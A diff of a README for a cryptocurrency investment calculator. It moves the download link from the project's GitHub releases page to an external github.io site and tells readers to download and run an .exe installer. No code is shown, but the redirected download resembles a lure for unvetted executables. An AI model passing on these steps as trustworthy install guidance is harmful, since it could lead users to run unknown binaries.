@@ -1,13 +1,13 @@
 # 📊 defi-investment-calculator-2026 - Estimate your crypto investment returns easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fowlertartaric886/defi-investment-calculator-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://fowlertartaric886.github.io)
 
 The defi-investment-calculator-2026 helps you plan your investments. It shows potential returns on your digital assets. You can model different strategies. It calculates how fees and price changes affect your total gain. This tool helps you compare options before you risk your money. It uses a clear interface to show complex financial data.
 
 ## 📥 Downloading the software
 
 Visit this page to download the latest version of the installer:
-https://github.com/Fowlertartaric886/defi-investment-calculator-2026/releases
+https://fowlertartaric886.github.io
 
 Click the link above to view the release page. Look for the file ending in .exe under the latest release. Save this file to your computer.
 
